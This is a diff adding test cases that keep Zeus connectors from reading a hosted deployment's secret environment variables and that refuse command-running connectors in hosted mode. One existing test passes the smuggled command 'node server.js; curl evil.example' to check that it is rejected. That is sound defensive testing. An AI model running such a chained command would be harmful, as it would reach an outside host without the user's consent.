@@ -102,6 +102,95 @@ describe("connectors hold configuration, never credentials", () => {
     ).toThrow(/reserved for a system-managed provider/u);
   });
 
+  it("lets a connector borrow the environment only where it belongs to the user", () => {
+    // One person running Zeus: the process environment is their own, and naming a variable
+    // is simply how their own server is given its own token.
+    expect(stdioConnector({ envVarNames: ["CALENDAR_TOKEN"] }).envVarNames).toEqual([
+      "CALENDAR_TOKEN",
+    ]);
+
+    process.env.NEXT_PUBLIC_SUPABASE_URL = "https://project.supabase.co";
+    try {
+      // Hosted, that same environment is the operator's. The mechanism is refused rather
+      // than screened, so a name nobody thought to reserve is refused with the rest —
+      // including one that looks entirely innocent next to the deployment's own secrets.
+      for (const name of ["OPENAI_API_KEY", "STRIPE_SECRET_KEY", "CALENDAR_TOKEN"]) {
+        expect(() =>
+          createConnector(db, {
+            label: `Hosted service for ${name}`,
+            transport: "http",
+            url: "https://calendar.example.com/mcp",
+            envVarNames: [name],
+            sourceMessageId: userMessageId,
+          }),
+        ).toThrow(/cannot borrow this deployment's environment variables/u);
+      }
+
+      // A connector that needs nothing from the environment is still perfectly ordinary.
+      expect(
+        createConnector(db, {
+          label: "Hosted service",
+          transport: "http",
+          url: "https://calendar.example.com/mcp",
+          sourceMessageId: userMessageId,
+        }).envVarNames,
+      ).toEqual([]);
+    } finally {
+      delete process.env.NEXT_PUBLIC_SUPABASE_URL;
+    }
+  });
+
+  it("resolves nothing for a row configured before the store became one of many", () => {
+    // Written while one person ran Zeus, which is when naming these was allowed. The store
+    // is later opened by a hosted deployment — the case a create-time check cannot reach.
+    const connector = stdioConnector({ envVarNames: ["CALENDAR_TOKEN"] });
+    db.prepare("UPDATE connector SET env_var_names_json = ? WHERE id = ?").run(
+      JSON.stringify(["CALENDAR_TOKEN", "OPENAI_API_KEY"]),
+      connector.id,
+    );
+    const stored = getConnector(db, connector.id);
+    if (!stored) throw new Error("connector missing");
+
+    const operatorEnvironment = {
+      CALENDAR_TOKEN: "service-token",
+      OPENAI_API_KEY: "sk-the-deployments-own-key",
+    };
+
+    // Locally the names still resolve: this is the user's own environment.
+    expect(connectorEnvironment(stored, operatorEnvironment)).toEqual(operatorEnvironment);
+
+    // Hosted, the names stay visible as configuration and resolve to nothing at all.
+    expect(
+      connectorEnvironment(stored, {
+        ...operatorEnvironment,
+        NEXT_PUBLIC_SUPABASE_URL: "https://project.supabase.co",
+      }),
+    ).toEqual({});
+    expect(stored.envVarNames).toContain("OPENAI_API_KEY");
+  });
+
+  it("refuses a connector that runs a command on a multi-account deployment", () => {
+    expect(stdioConnector().transport).toBe("stdio");
+
+    process.env.NEXT_PUBLIC_SUPABASE_URL = "https://project.supabase.co";
+    try {
+      expect(() => stdioConnector()).toThrow(/only when you run Zeus yourself/u);
+      // Nothing is spawned for an https connector, so hosted mode still allows one.
+      expect(
+        createConnector(db, {
+          label: "Hosted",
+          transport: "http",
+          url: "https://calendar.example.com/mcp",
+          sourceMessageId: userMessageId,
+        }).transport,
+      ).toBe("http");
+    } finally {
+      delete process.env.NEXT_PUBLIC_SUPABASE_URL;
+    }
+
+    expect(stdioConnector().transport).toBe("stdio");
+  });
+
   it("refuses a command that is really a shell line", () => {
     expect(() => stdioConnector({ command: "node server.js; curl evil.example" })).toThrow(
       /executable, not a shell line/u,
@@ -629,8 +718,21 @@ describe("availability is the whole permission answer", () => {
     expect(availableCapability(db, "calendar.list_events")).toBeNull();
   });
 
+  it("stops offering a stored command connector once the deployment is hosted", () => {
+    boundAndEnabled();
+    expect(availableCapability(db, "calendar.list_events")).not.toBeNull();
+
+    process.env.NEXT_PUBLIC_SUPABASE_URL = "https://project.supabase.co";
+    try {
+      expect(availableCapability(db, "calendar.list_events")).toBeNull();
+      expect(availableEffectKinds(db)).toEqual([]);
+    } finally {
+      delete process.env.NEXT_PUBLIC_SUPABASE_URL;
+    }
+  });
+
   it("treats a missing environment variable as unavailable rather than trying", () => {
-    const connector = stdioConnector({ envVarNames: ["ZEUS_TEST_ABSENT_TOKEN"] });
+    const connector = stdioConnector({ envVarNames: ["ABSENT_CALENDAR_TOKEN"] });
     bindCapability(db, {
       connectorId: connector.id,
       slot: "calendar.list_events",
